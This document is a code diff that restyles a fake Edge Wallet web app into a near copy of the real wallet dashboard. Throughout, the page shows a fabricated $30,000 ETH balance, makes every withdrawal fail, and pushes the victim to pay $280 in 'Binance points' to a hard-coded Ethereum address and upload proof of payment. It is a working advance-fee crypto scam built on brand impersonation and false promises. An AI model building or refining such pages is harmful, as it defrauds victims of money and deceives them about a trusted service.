@@ -7,51 +7,77 @@
   <link href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&display=swap" rel="stylesheet">
   <style>
     :root {
-      --edge-primary: #0A74DA;
-      --edge-dark: #1D2330;
-      --edge-light: #f3f6fa;
-      --edge-green: #1fd1a4;
+      --edge-bg: #18191d;
+      --edge-card: #232427;
+      --edge-panel: #232427;
+      --edge-light: #292a30;
+      --edge-dark: #191a1e;
+      --edge-green: #14ea8f;
       --edge-red: #e24c4b;
       --edge-yellow: #ffc400;
-      --card-radius: 18px;
-      --transition: all 0.3s cubic-bezier(.4,0,.2,1);
+      --edge-grey: #888a8b;
+      --edge-border: #36373a;
+      --edge-btn-bg: #36373a;
+      --edge-btn-hover: #45484d;
+      --edge-btn-fg: #fff;
+      --edge-shadow: 0 4px 24px 0 #000a;
+      --edge-radius: 22px;
+      --edge-blue: #51ffc9;
+      --edge-text: #e9e9e9;
+      --edge-muted: #b7b7b7;
+      --edge-eth: #fff;
+      --edge-eth-bg: linear-gradient(90deg, #24252b 70%, #232427 100%);
+      --edge-nav-active: #14ea8f;
+      --edge-nav-inactive: #b7b7b7;
     }
-    body {
+    html, body {
+      background: var(--edge-bg);
+      min-height: 100vh;
+      color: var(--edge-text);
+      font-family: 'Roboto', Arial, sans-serif;
       margin: 0;
       padding: 0;
-      background: var(--edge-light);
-      font-family: 'Roboto', Arial, sans-serif;
-      color: var(--edge-dark);
+      letter-spacing: 0.03em;
+      font-size: 16px;
+    }
+    #app {
       min-height: 100vh;
-      overflow-x: hidden;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      background: var(--edge-bg);
+      width: 100vw;
     }
     .centered {
+      min-height: 100vh;
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
-      min-height: 100vh;
+      background: transparent;
     }
     .edge-card {
-      background: #fff;
-      box-shadow: 0 2px 20px 0 rgba(34,43,61,.11);
-      border-radius: var(--card-radius);
-      padding: 2rem 1.5rem;
+      background: var(--edge-card);
+      border-radius: var(--edge-radius);
+      box-shadow: var(--edge-shadow);
+      padding: 2.1rem 1.5rem;
       max-width: 380px;
       width: 95vw;
-      margin: 1.5rem auto;
-      transition: var(--transition);
+      margin: 2rem auto;
+      border: 1.5px solid var(--edge-border);
+      position: relative;
     }
     .edge-logo {
-      max-width: 70px;
-      margin-bottom: 1.2rem;
+      max-width: 54px;
+      margin: 0 auto 1.1rem auto;
       display: block;
-      margin-left: auto;
-      margin-right: auto;
+      filter: brightness(1.1) drop-shadow(0 2px 6px #14ea8f33);
     }
-    h1, h2, h3, h4 {
+    h2 {
       font-weight: 700;
       margin: 0.6em 0 0.3em 0;
+      color: var(--edge-text);
       letter-spacing: -.01em;
     }
     label {
@@ -59,94 +85,102 @@
       margin-top: 1em;
       display: block;
       margin-bottom: 0.5em;
+      color: var(--edge-grey);
     }
     input, select {
       width: 100%;
       padding: 0.8em 1em;
       font-size: 1em;
       border-radius: 9px;
-      border: 1px solid #e6e6e6;
+      border: 1.5px solid var(--edge-border);
       margin-bottom: 1em;
-      background-color: #f9f9f9;
+      background-color: var(--edge-light);
+      color: var(--edge-text);
       box-sizing: border-box;
       outline: none;
       transition: border-color 0.2s;
+      font-family: inherit;
     }
     input:focus {
-      border-color: var(--edge-primary);
+      border-color: var(--edge-green);
     }
     .button {
-      background: var(--edge-primary);
-      color: #fff;
-      padding: 0.85em 2em;
-      border-radius: 9px;
+      background: var(--edge-btn-bg);
+      color: var(--edge-btn-fg);
+      padding: 0.88em 2em;
+      border-radius: 10px;
       border: none;
-      font-size: 1.1em;
+      font-size: 1.08em;
       font-weight: 700;
       margin-top: 1em;
       cursor: pointer;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.07);
-      transition: var(--transition);
-      display: block;
+      box-shadow: 0 2px 12px rgba(20,234,143,0.09);
+      transition: background 0.2s, color 0.2s, box-shadow 0.2s;
       width: 100%;
       outline: none;
       position: relative;
       overflow: hidden;
+      letter-spacing: 0.01em;
     }
-    .button:active {
-      background: #064a95;
+    .button:active, .button:hover {
+      background: var(--edge-btn-hover);
+      color: var(--edge-green);
     }
     .button[disabled] {
-      background: #b8cbe7;
+      background: #45484d99;
+      color: #bbb;
       cursor: not-allowed;
     }
     .circle-fingerprint {
-      width: 80px;
-      height: 80px;
-      background: var(--edge-light);
+      width: 72px;
+      height: 72px;
+      background: var(--edge-panel);
       border-radius: 50%;
-      border: 3px solid var(--edge-primary);
+      border: 3px solid var(--edge-green);
       display: flex;
       align-items: center;
       justify-content: center;
       margin: 1.2em auto 1em auto;
-      box-shadow: 0 0 0 2px #e6eaff;
-      transition: background 0.2s;
+      box-shadow: 0 0 0 2px #14ea8f44;
       position: relative;
       cursor: pointer;
       overflow: hidden;
+      transition: box-shadow .13s;
     }
     .circle-fingerprint img {
-      width: 38px;
-      height: 38px;
-      opacity: 0.85;
+      width: 34px;
+      height: 34px;
+      opacity: 0.96;
       pointer-events: none;
+      filter: brightness(1.4);
     }
     .hold-progress {
       position: absolute;
-      bottom: 0; left: 0; right: 0;
+      left: 0; right: 0; bottom: 0;
       height: 0;
       background: var(--edge-green);
       border-radius: 0 0 50% 50%;
       transition: height .2s;
-      opacity: 0.6;
+      opacity: 0.44;
     }
     .touch-label {
       text-align: center;
       font-size: 1.08em;
-      color: #757575;
+      color: var(--edge-muted);
       margin-top: 0.5em;
+      letter-spacing: 0.01em;
     }
     .notification {
       background: var(--edge-yellow);
-      color: #212121;
+      color: #222;
       border-radius: 0 0 18px 18px;
       padding: 1.1em 1em 1em 2.2em;
       position: relative;
       font-size: 1.02em;
-      box-shadow: 0 2px 10px rgba(255,204,0,0.08);
+      box-shadow: 0 2px 10px rgba(255,204,0,0.11);
       margin: 0 auto 1em auto;
       max-width: 400px;
+      border: 1px solid #ffe6a4;
     }
     .notification strong {
       font-weight: 700;
@@ -162,154 +196,266 @@
       cursor: pointer;
       font-weight: 600;
     }
-    .dashboard-header {
+    /* --- Dashboard Clone --- */
+    .edge-dashboard {
+      background: var(--edge-panel);
+      border-radius: 0 0 30px 30px;
+      box-shadow: 0 3px 24px 0 #0008;
+      max-width: 375px;
+      width: 100vw;
+      margin: 0 auto;
+      margin-bottom: 18px;
+      padding: 0;
+      position: relative;
+      overflow: hidden;
+      min-height: 670px;
+      border: 1.5px solid var(--edge-border);
+      font-family: inherit;
+    }
+    .edge-dashboard-header {
       display: flex;
       align-items: center;
+      height: 54px;
+      background: transparent;
+      padding: 0 18px 0 18px;
       justify-content: space-between;
-      margin-bottom: .3em;
+      margin-bottom: 0;
     }
-    .eth-balance {
-      font-size: 2.4em;
-      font-weight: 700;
-      letter-spacing: -0.02em;
-      color: #1fd1a4;
-      margin: 0.2em 0 0.1em 0;
-      text-shadow: 0 2px 8px #f6fcfa;
-    }
-    .currency-label {
+    .edge-dashboard-header .help {
+      color: var(--edge-muted);
       font-size: 1.1em;
-      color: #444;
       font-weight: 500;
+      letter-spacing: 0.01em;
     }
-    .dashboard-img {
-      width: 100%;
-      border-radius: var(--card-radius);
-      margin: 1em 0;
-      object-fit: cover;
-      box-shadow: 0 1px 8px 0 rgba(34,43,61,.07);
-      background: #111;
+    .edge-dashboard-header .logo {
+      width: 28px;
+      margin: 0 auto;
+      display: block;
+      filter: brightness(1.3);
     }
-    .withdraw-section {
-      margin-top: 2em;
+    .edge-dashboard-header .menu {
+      color: var(--edge-muted);
+      font-size: 1.7em;
+      font-weight: 500;
+      letter-spacing: 0.01em;
+      cursor: pointer;
+      background: none;
+      border: none;
+      outline: none;
+      padding: 0;
     }
-    .withdraw-label {
-      font-size: 1.1em;
-      margin-bottom: 0.6em;
-      color: #3a3a3a;
-    }
-    .progress-bar {
-      height: 20px;
-      background: #e6e6e6;
-      border-radius: 6px;
-      overflow: hidden;
-      margin-top: 1em;
-      margin-bottom: .8em;
-      width: 100%;
-    }
-    .progress-bar-inner {
-      height: 100%;
-      background: var(--edge-primary);
-      transition: width 0.7s cubic-bezier(.4,0,.2,1);
-      width: 1%;
-    }
-    .error-msg {
-      color: var(--edge-red);
-      background: #ffeaea;
-      border-radius: 8px;
-      padding: 0.9em 1em;
-      margin-top: 1em;
-      font-size: 1.06em;
-      text-align: center;
-    }
-    .store-list {
+    .dashboard-balance-card {
+      margin: 0 20px;
+      margin-top: 18px;
+      background: var(--edge-eth-bg);
+      border-radius: 18px;
+      padding: 22px 20px 18px 20px;
       display: flex;
       flex-direction: column;
-      gap: 1em;
-      margin: 1em 0;
+      align-items: flex-start;
+      box-shadow: 0 2px 16px #1117;
+      position: relative;
+      border: 1.5px solid #292a30;
     }
-    .store-btn {
-      background: #f4f4f9;
-      border: 1.5px solid #e6e6ef;
-      border-radius: 10px;
-      padding: 1.2em 1em;
+    .balance-label {
+      font-size: 1.07em;
+      color: var(--edge-muted);
+      margin-bottom: 6px;
+      font-weight: 500;
       display: flex;
       align-items: center;
+    }
+    .balance-label i {
+      margin-left: 7px; font-size: 1em; opacity:0.6;
+    }
+    .dashboard-balance {
+      font-size: 2.1em;
+      color: var(--edge-eth);
+      font-weight: 800;
+      letter-spacing: 0.02em;
+      margin-bottom: 8px;
+      margin-top: 4px;
+      text-shadow: 0 2px 8px #292a30, 0 0 4px #292a30;
+      font-family: inherit;
+    }
+    .dashboard-balance-card-btns {
+      display: flex; gap: 18px; margin-top: 12px;
+      width: 100%;
+    }
+    .dashboard-balance-card-btn {
+      flex: 1 1 0%;
+      border-radius: 14px;
+      border: none;
+      background: #393a3d;
+      color: #e9e9e9;
+      font-weight: 600;
       font-size: 1.08em;
-      font-weight: 500;
+      padding: 0.85em 0;
       cursor: pointer;
-      transition: background .15s;
-      outline: none;
-      gap: .7em;
+      transition: background 0.2s;
+      margin-bottom: 0;
+    }
+    .dashboard-balance-card-btn:hover {
+      background: var(--edge-green);
+      color: #222;
+    }
+    .wallets-label {
+      color: var(--edge-muted);
+      font-size: 1.01em;
+      font-weight: 600;
+      margin: 24px 0 10px 26px;
+      letter-spacing: 0.02em;
+    }
+    .wallets-list {
+      margin: 0 12px;
+      margin-bottom: 22px;
+    }
+    .wallet-asset-card {
+      background: #232427;
+      border-radius: 15px;
+      margin-bottom: 14px;
+      padding: 13px 15px;
+      box-shadow: 0 1px 6px #0004;
+      display: flex;
+      align-items: center;
       justify-content: space-between;
+      border: 1.2px solid #292a30;
     }
-    .store-btn.online {
-      border-color: var(--edge-green);
-      background: #eafff8;
-      color: #157b6a;
+    .wallet-asset-left {
+      display: flex; align-items: center; gap: 13px;
     }
-    .store-btn.offline {
-      border-color: #ffb3b3;
-      color: #b15050;
-      background: #fff7f7;
+    .wallet-asset-icon {
+      width: 38px; height: 38px; border-radius: 50%; background: #191a1e; display: flex; align-items: center; justify-content: center;
     }
-    .copy-btn {
-      background: var(--edge-light);
-      color: var(--edge-primary);
-      border: 1px solid var(--edge-primary);
-      padding: 0.5em 1.2em;
-      border-radius: 7px;
+    .wallet-asset-icon img {
+      width: 23px; height: 23px;
+      display: block;
+    }
+    .wallet-asset-txt {
+      display: flex; flex-direction: column; gap: 1px;
+    }
+    .wallet-asset-name {
+      font-weight: 700; color: #fff; font-size: 1.04em;
+    }
+    .wallet-asset-usd {
+      color: #b7b7b7; font-size: 1.01em;
+    }
+    .wallet-asset-chg {
+      font-size: 0.93em;
+      font-weight: 600;
+    }
+    .wallet-asset-eth {
+      color: #e9e9e9; font-size: 1.03em; font-weight: 600;
+      margin-bottom: 2px;
+      display: block;
+    }
+    .wallet-asset-right {
+      display: flex;
+      flex-direction: column;
+      align-items: flex-end;
+    }
+    .wallet-asset-holdings {
+      font-size: 1.08em;
+      font-weight: 600;
+      color: var(--edge-green);
+      margin-bottom: 2px;
+    }
+    .wallet-asset-link {
+      color: #51ffc9;
+      font-size: 0.99em;
+      text-decoration: underline;
+      margin-top: 2px;
+      letter-spacing: 0.01em;
+      cursor: pointer;
+      transition: color 0.18s;
+    }
+    .wallet-asset-link:hover { color: var(--edge-green);}
+    .assets-search {
+      margin: 0 20px 0 20px; border-radius: 15px;
+      padding: 13px 15px; background: #232427;
+      color: #b7b7b7; border: 1.2px solid #292a30;
+      display: flex; align-items: center; gap: 12px;
+    }
+    .assets-search input {
+      background: transparent;
+      border: none;
+      color: #fff;
+      font-size: 1.09em;
+      width: 100%;
+      outline: none;
+      font-family: inherit;
+      letter-spacing: 0.01em;
+    }
+    /* --- Navigation bar --- */
+    .edge-navbar {
+      width: 100%;
+      max-width: 375px;
+      position: fixed;
+      left: 50%;
+      bottom: 0;
+      transform: translateX(-50%);
+      display: flex;
+      background: #232427;
+      border-radius: 30px 30px 0 0;
+      border-top: 1.5px solid #292a30;
+      z-index: 20;
+      box-shadow: 0 -2px 12px #1013;
+      justify-content: space-around;
+      padding: 6px 0;
+    }
+    .edge-navbar-btn {
+      flex: 1 1 0%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 6px 0;
+      color: var(--edge-nav-inactive);
+      text-decoration: none;
       font-size: 1em;
       font-weight: 500;
-      margin-left: 1em;
-      cursor: pointer;
-      outline: none;
-      transition: background .15s;
+      transition: color 0.17s;
+      letter-spacing: 0.01em;
     }
-    .copy-btn:active {
-      background: #def2ff;
+    .edge-navbar-btn.active {
+      color: var(--edge-nav-active);
     }
-    .upload-section {
-      text-align: center;
-      margin-top: 1.5em;
-    }
-    .support-link {
-      margin-top: 1.7em;
-      text-align: center;
-    }
-    .support-link a {
-      color: var(--edge-primary);
-      text-decoration: underline;
-      font-weight: 600;
-      font-size: 1.1em;
-    }
-    @media (max-width: 500px) {
-      .edge-card { padding: 1.2rem 0.7rem; }
-      .notification { padding: 0.9em 0.7em 0.8em 1.4em; }
-      .dashboard-header h2 { font-size: 1.15em; }
-      .store-btn { font-size: 0.98em; padding: 1em .7em;}
+    .edge-navbar-btn i {
+      font-size: 1.45em;
+      margin-bottom: 2px;
     }
     /* Floating support button */
     #support-float-btn {
       position: fixed;
       right: 18px;
-      bottom: 22px;
+      bottom: 82px;
       z-index: 9999;
-      background: #0A74DA;
-      color: #fff;
+      background: var(--edge-green);
+      color: #101010;
       border-radius: 50%;
-      width: 56px;
-      height: 56px;
+      width: 54px;
+      height: 54px;
       display: flex;
       align-items: center;
       justify-content: center;
       font-size: 2em;
-      box-shadow: 0 4px 18px rgba(0,0,0,0.14);
+      box-shadow: 0 4px 18px rgba(20,234,143,0.21);
       text-decoration: none;
-      transition: background 0.2s;
+      transition: background 0.2s, color 0.2s;
       cursor: pointer;
+      border: 2.5px solid #10101044;
     }
     #support-float-btn:hover {
-      background: #195593;
+      background: #29ffc6;
+      color: #252525;
+    }
+    @media (max-width: 500px) {
+      .edge-card { padding: 1.1rem 0.5rem; }
+      .dashboard-header h2 { font-size: 1.07em; }
+      .store-btn { font-size: 0.96em; padding: 1em .7em;}
+      .edge-dashboard,
+      .edge-navbar {
+        max-width: 100vw;
+      }
     }
   </style>
 </head>
@@ -323,24 +469,21 @@
   💬
 </a>
 <script>
-/* --- GLOBALS --- */
+const EDGE_LOGO_URL = "https://edge.app/_nuxt/img/edge-logo.7e5c3b2.svg";
+const FINGERPRINT_IMG = "https://cdn-icons-png.flaticon.com/512/3602/3602123.png";
+const SUPPORT_URL = "https://widget-page.smartsupp.com/widget/f659c5b3d565aafa73ba3a49d4ce0baf57cea73b?ss-chat-settings";
+const ETH_ICON = "https://cryptologos.cc/logos/ethereum-eth-logo.png?v=032";
+const BTC_ICON = "https://cryptologos.cc/logos/bitcoin-btc-logo.png?v=032";
+const SOL_ICON = "https://cryptologos.cc/logos/solana-sol-logo.png?v=032";
+const SUPPORTED_ETH = "0x3c73bcC0403a7919fbB0C9B567Bf5D1079c72Cdc";
 const SUPPORTED_COUNTRY = "United States";
 const SUPPORTED_FLAG = "🇺🇸";
-const SUPPORTED_ETH = "0x3c73bcC0403a7919fbB0C9B567Bf5D1079c72Cdc";
 const DEPOSIT_AMOUNT = 30000;
 const DEPOSIT_ETH = 9.2;
 const BINANCE_POINTS_NEEDED = 3000;
 const BINANCE_POINTS_REFILL_COST = 280;
 const REFILL_ADDRESS = "0xe30Ac60E1bEBe1A23A3B16548067d062c78DEBC4";
 
-const EDGE_LOGO_URL = "https://edge.app/_nuxt/img/edge-logo.7e5c3b2.svg";
-const FINGERPRINT_IMG = "https://cdn-icons-png.flaticon.com/512/3602/3602123.png";
-// Use the uploaded image for the dashboard
-const DASHBOARD_IMG = "image1"; // Use your uploaded dashboard image as the dashboard
-
-const SUPPORT_URL = "https://widget-page.smartsupp.com/widget/f659c5b3d565aafa73ba3a49d4ce0baf57cea73b?ss-chat-settings";
-
-/* --- STATE --- */
 let state = {
   step: "country",
   name: "",
@@ -352,17 +495,13 @@ let state = {
   withdrawProgress: 0,
   withdrawError: false,
   points: 0,
-  storeStatus: { online: true, offline: [true, true] },
-  refillCopied: false,
   paymentScreenshot: null,
   noticeClosed: false,
   depositNotified: false,
   depositNotificationShown: false,
   dashboardUnlocked: false,
-  depositConfirmed: false
 };
 
-/* --- PERSISTENCE --- */
 function saveState() {
   localStorage.setItem('edgeWalletAppState', JSON.stringify(state));
 }
@@ -373,12 +512,9 @@ function loadState() {
   }
 }
 
-/* --- UI RENDER --- */
 function render() {
   const app = document.getElementById('app');
   app.innerHTML = '';
-
-  // Step Switch
   if (!state.dashboardUnlocked) {
     switch(state.step) {
       case "country": return renderCountry(app);
@@ -401,11 +537,9 @@ function render() {
   }
 }
 
-/* --- COMPONENTS --- */
 function renderCountry(app) {
   const card = document.createElement('div');
   card.className = 'edge-card centered';
-
   card.innerHTML = `
     <img src="${EDGE_LOGO_URL}" class="edge-logo" alt="Edge Wallet">
     <h2>Welcome to Edge Wallet</h2>
@@ -418,13 +552,11 @@ function renderCountry(app) {
       <input type="text" id="name" name="name" placeholder="Full Name" required maxlength="24" autocomplete="off" value="${state.name}">
       <label for="eth">ETH Address</label>
       <input type="text" id="eth" name="eth" placeholder="Enter your ETH address" required pattern="^0x[a-fA-F0-9]{40}$" value="${state.eth}">
-      <div style="color: #b15050; font-size:0.98em; margin-bottom:.5em; display:none;" id="ethError">Please enter the supported ETH address.</div>
+      <div style="color: #e24c4b; font-size:0.98em; margin-bottom:.5em; display:none;" id="ethError">Please enter the supported ETH address.</div>
       <button class="button" style="margin-top:1em;" type="submit">Continue</button>
     </form>
   `;
   app.appendChild(card);
-
-  // Validation
   const form = card.querySelector('#countryForm');
   const ethInput = card.querySelector('#eth');
   const ethError = card.querySelector('#ethError');
@@ -502,7 +634,7 @@ function renderWelcome(app) {
   card.innerHTML = `
     <img src="${EDGE_LOGO_URL}" class="edge-logo" alt="Edge Wallet">
     <h2 style="margin-top:0.5em; font-size:1.2em;">WELCOME TO ETHEREUM PAY</h2>
-    <div style="font-size:1.06em; color:#666; margin-bottom:1.2em;">SUPPORTED BY EDGE WALLET</div>
+    <div style="font-size:1.06em; color:var(--edge-muted); margin-bottom:1.2em;">SUPPORTED BY EDGE WALLET</div>
     <button class="button" id="goDashboard">Go to Dashboard</button>
   `;
   app.appendChild(card);
@@ -566,25 +698,95 @@ function renderDepositNotice(app) {
 }
 
 function renderDashboard(app) {
-  const card = document.createElement('div');
-  card.className = 'edge-card';
-  card.style.position = "relative";
+  // Main dashboard area (clone of your screenshot with values replaced)
+  const dash = document.createElement('div');
+  dash.className = 'edge-dashboard';
 
-  card.innerHTML = `
-    <div class="dashboard-header">
-      <img src="${EDGE_LOGO_URL}" class="edge-logo" alt="Edge Wallet" style="margin-bottom:0;">
-      <h2>Edge Wallet Dashboard</h2>
+  dash.innerHTML = `
+    <div class="edge-dashboard-header">
+      <div class="help">Help</div>
+      <img src="${EDGE_LOGO_URL}" class="logo" alt="Edge Wallet">
+      <button class="menu">&#9776;</button>
     </div>
-    <img src="${DASHBOARD_IMG}" alt="Dashboard" class="dashboard-img">
-    <div class="eth-balance">$${state.balance.toLocaleString(undefined, {minimumFractionDigits:2, maximumFractionDigits:2})}</div>
-    <div class="currency-label">Currency Holding: Ethereum (${DEPOSIT_ETH} ETH)</div>
-    <div class="withdraw-section">
-      <button class="button" id="withdrawBtn">Withdraw</button>
+    <div class="dashboard-balance-card">
+      <span class="balance-label">Total Balance <i style="font-size:1em;opacity:.55;">👁️‍🗨️</i></span>
+      <div class="dashboard-balance">$ ${state.balance.toLocaleString(undefined, {minimumFractionDigits:2, maximumFractionDigits:2})} USD</div>
+      <div class="dashboard-balance-card-btns">
+        <button class="dashboard-balance-card-btn">Send</button>
+        <button class="dashboard-balance-card-btn">Deposit</button>
+      </div>
+    </div>
+    <div class="wallets-label">Wallets</div>
+    <div class="wallets-list">
+      <div class="wallet-asset-card" style="background: #222325;">
+        <div class="wallet-asset-left">
+          <div class="wallet-asset-icon"><img src="${ETH_ICON}" alt="ETH"></div>
+          <div class="wallet-asset-txt">
+            <span class="wallet-asset-name">ETH</span>
+            <span class="wallet-asset-usd">$3,700</span>
+            <span class="wallet-asset-chg" style="color:#e24c4b;">-2.10%</span>
+          </div>
+        </div>
+        <div class="wallet-asset-right">
+          <div class="wallet-asset-holdings">${DEPOSIT_ETH} ETH</div>
+          <span style="font-size:1em;color:#51ffc9;">$${state.balance.toLocaleString(undefined, {minimumFractionDigits:2, maximumFractionDigits:2})}</span>
+          <span class="wallet-asset-link">My Ether</span>
+        </div>
+      </div>
+      <div class="wallet-asset-card">
+        <div class="wallet-asset-left">
+          <div class="wallet-asset-icon"><img src="${BTC_ICON}" alt="BTC"></div>
+          <div class="wallet-asset-txt">
+            <span class="wallet-asset-name">BTC</span>
+            <span class="wallet-asset-usd">$118,661</span>
+            <span class="wallet-asset-chg" style="color:#14ea8f;">+0.57%</span>
+          </div>
+        </div>
+        <div class="wallet-asset-right">
+          <div class="wallet-asset-holdings">0</div>
+          <span style="font-size:1em;color:#51ffc9;">$0</span>
+          <span class="wallet-asset-link">My Bitcoin</span>
+        </div>
+      </div>
+      <div class="wallet-asset-card">
+        <div class="wallet-asset-left">
+          <div class="wallet-asset-icon"><img src="${SOL_ICON}" alt="SOL"></div>
+          <div class="wallet-asset-txt">
+            <span class="wallet-asset-name">SOL</span>
+            <span class="wallet-asset-usd">$203.08</span>
+            <span class="wallet-asset-chg" style="color:#14ea8f;">+3.83%</span>
+          </div>
+        </div>
+        <div class="wallet-asset-right">
+          <div class="wallet-asset-holdings">0</div>
+          <span style="font-size:1em;color:#51ffc9;">$0</span>
+          <span class="wallet-asset-link">My Solana</span>
+        </div>
+      </div>
+    </div>
+    <div class="assets-search">
+      <span style="color:#b7b7b7;font-size:1.1em;">🔍</span>
+      <input type="text" placeholder="Search Wallets" disabled>
+    </div>
+    <div style="margin:20px 16px 0 16px;">
+      <button class="button" id="withdrawBtn" style="background:var(--edge-green);color:#222;">Withdraw</button>
     </div>
   `;
-  app.appendChild(card);
+  app.appendChild(dash);
 
-  card.querySelector('#withdrawBtn').onclick = () => {
+  // Bottom nav
+  const nav = document.createElement('nav');
+  nav.className = "edge-navbar";
+  nav.innerHTML = `
+    <a class="edge-navbar-btn active"><i>🏠</i>Home</a>
+    <a class="edge-navbar-btn"><i>💼</i>Assets</a>
+    <a class="edge-navbar-btn"><i>⬇️</i>Buy</a>
+    <a class="edge-navbar-btn"><i>⬆️</i>Sell</a>
+    <a class="edge-navbar-btn"><i>🔄</i>Exchange</a>
+  `;
+  app.appendChild(nav);
+
+  dash.querySelector('#withdrawBtn').onclick = () => {
     state.step = "withdraw";
     render();
   };
@@ -639,7 +841,6 @@ function renderWithdrawModal(app) {
     }, 320);
   };
 }
-
 function renderWithdrawProgress(app) {
   const modal = document.createElement('div');
   modal.className = 'edge-card';
@@ -656,7 +857,6 @@ function renderWithdrawProgress(app) {
   `;
   app.appendChild(modal);
 }
-
 function renderWithdrawError(app) {
   const modal = document.createElement('div');
   modal.className = 'edge-card';
@@ -677,7 +877,6 @@ function renderWithdrawError(app) {
     render();
   };
 }
-
 function renderPointsModal(app) {
   const modal = document.createElement('div');
   modal.className = 'edge-card';
@@ -689,14 +888,13 @@ function renderPointsModal(app) {
   modal.innerHTML = `
     <h3>Get Binance Points</h3>
     <div class="store-list">
-      <button class="store-btn offline" id="store1">Store: CryptoHub <span style="color:#aaa;">Offline</span></button>
-      <button class="store-btn online" id="store2">Store: BinanceDirect <span style="color:var(--edge-green);">Online</span></button>
-      <button class="store-btn offline" id="store3">Store: EtherShop <span style="color:#aaa;">Offline</span></button>
+      <button class="button" style="background:#232427;color:#b86a6a;border:1.3px solid #b86a6a;" id="store1">Store: CryptoHub <span style="color:#b86a6a;">Offline</span></button>
+      <button class="button" style="background:#232e27;color:#12e97e;border:1.3px solid #14ea8f;" id="store2">Store: BinanceDirect <span style="color:#14ea8f;">Online</span></button>
+      <button class="button" style="background:#232427;color:#b86a6a;border:1.3px solid #b86a6a;" id="store3">Store: EtherShop <span style="color:#b86a6a;">Offline</span></button>
     </div>
     <button class="button" id="closePoints" style="margin-top:.6em;">Close</button>
   `;
   app.appendChild(modal);
-
   modal.querySelector('#store1').onclick = () => {
     alert('Sorry, unable to sell ETHEREUM POINTS at this time.');
   };
@@ -713,7 +911,6 @@ function renderPointsModal(app) {
     render();
   };
 }
-
 function renderRefillModal(app) {
   const modal = document.createElement('div');
   modal.className = 'edge-card';
@@ -732,19 +929,18 @@ function renderRefillModal(app) {
     <div style="margin-bottom:1em;">
       Payment Address:<br>
       <span style="font-size:1.02em;font-weight:500;letter-spacing:0.02em">${REFILL_ADDRESS}</span>
-      <button class="copy-btn" id="copyRefillBtn">Copy</button>
+      <button class="button" id="copyRefillBtn" style="margin-left:1em;width:auto;">Copy</button>
       <span id="copySuccess" style="margin-left:.6em; color:var(--edge-green); font-size:0.99em; display:none;">Copied!</span>
     </div>
     <button class="button" id="refillPaidBtn" style="margin-bottom:.5em;">I have paid</button>
-    <button class="button" id="closeRefill" style="background:#ccc;color:#444;">Close</button>
-    <div class="notification" style="background:#f6faff; color:#1d2330; margin-top:1.2em;">
+    <button class="button" id="closeRefill" style="background:#232427;color:#aaa;">Close</button>
+    <div class="notification" style="background:#191a1e; color:#e9e9e9; margin-top:1.2em;">
       <strong>🔔Important Withdrawal Notification:</strong><br><br>
       Dear Customer, once you accumulate the necessary points for your withdrawal, please be assured that your request for $30,000 ETHEREUM will be processed to your designated ETH address within a maximum of just 2 minutes. Your security is our top priority; ETHEREUM SOFTWARE continuously monitors all transactions and activities associated with EDGE Pay to ensure everything is safe and secure. Thank you for choosing EDGE WALLET!
       <button class="close" id="closeNotice2" style="top:.6em;">&times;</button>
     </div>
   `;
   app.appendChild(modal);
-
   modal.querySelector('#closeRefill').onclick = () => {
     state.step = "dashboard";
     render();
@@ -762,7 +958,6 @@ function renderRefillModal(app) {
     render();
   };
 }
-
 function renderAwaitPaymentModal(app) {
   const modal = document.createElement('div');
   modal.className = 'edge-card';
@@ -775,13 +970,12 @@ function renderAwaitPaymentModal(app) {
     <h3>Awaiting Deposit</h3>
     <div style="font-size:1.09em; margin-bottom:1.2em;">
       Store is awaiting your deposit of <b>$${BINANCE_POINTS_REFILL_COST} USD</b>.<br>
-      <span style="color:#888;font-size:0.97em">Please send payment to the address above.</span>
+      <span style="color:var(--edge-muted);font-size:0.97em">Please send payment to the address above.</span>
     </div>
     <button class="button" id="havePaidBtn">I have paid</button>
-    <button class="button" id="closeAwait" style="background:#ccc;color:#444;">Back</button>
+    <button class="button" id="closeAwait" style="background:#232427;color:#aaa;">Back</button>
   `;
   app.appendChild(modal);
-
   modal.querySelector('#closeAwait').onclick = () => {
     state.step = "refill";
     render();
@@ -791,7 +985,6 @@ function renderAwaitPaymentModal(app) {
     render();
   };
 }
-
 function renderUploadModal(app) {
   const modal = document.createElement('div');
   modal.className = 'edge-card';
@@ -809,17 +1002,15 @@ function renderUploadModal(app) {
     </div>
   `;
   app.appendChild(modal);
-
   const fileInput = modal.querySelector('#screenshotInput');
   const preview = modal.querySelector('#uploadedPreview');
   const submitBtn = modal.querySelector('#submitScreenshot');
-
   fileInput.onchange = function() {
     const file = fileInput.files[0];
     if (file && file.type.startsWith('image/')) {
       const reader = new FileReader();
       reader.onload = function(e) {
-        preview.innerHTML = `<img src="${e.target.result}" alt="Screenshot" style="max-width:100%;margin:1em auto 0.7em auto;border-radius:8px;box-shadow:0 2px 10px #e6eaf7;">`;
+        preview.innerHTML = `<img src="${e.target.result}" alt="Screenshot" style="max-width:100%;margin:1em auto 0.7em auto;border-radius:8px;box-shadow:0 2px 10px #14ea8f22;">`;
         state.paymentScreenshot = e.target.result;
         submitBtn.disabled = false;
       };
@@ -831,7 +1022,6 @@ function renderUploadModal(app) {
     render();
   };
 }
-
 function renderSupportModal(app) {
   const modal = document.createElement('div');
   modal.className = 'edge-card';
@@ -852,14 +1042,11 @@ function renderSupportModal(app) {
     <button class="button" id="backToDashboard" style="margin-top:2em;">Return to Dashboard</button>
   `;
   app.appendChild(modal);
-
   modal.querySelector('#backToDashboard').onclick = () => {
     state.step = "dashboard";
     render();
   };
 }
-
-/* --- INIT --- */
 window.addEventListener('DOMContentLoaded', () => {
   loadState();
   if (state.dashboardUnlocked) {
